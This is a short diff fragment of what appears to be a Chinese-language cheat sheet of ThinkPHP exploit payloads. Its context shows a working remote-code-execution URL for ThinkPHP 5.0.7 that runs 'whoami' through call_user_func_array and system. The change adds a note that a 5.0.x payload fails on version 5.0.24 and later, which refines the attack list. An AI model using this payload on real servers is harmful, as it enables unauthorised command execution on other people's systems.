@@ -127,7 +127,7 @@ Thinkphp 5.0.7
 /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
 ```
 
-Thinkphp 5.0.x
+Thinkphp 5.0.x  （5.0.24及以上不能）
 
 ```
 get:（开兼容模式）(有些地方必须要/index.php?s=)
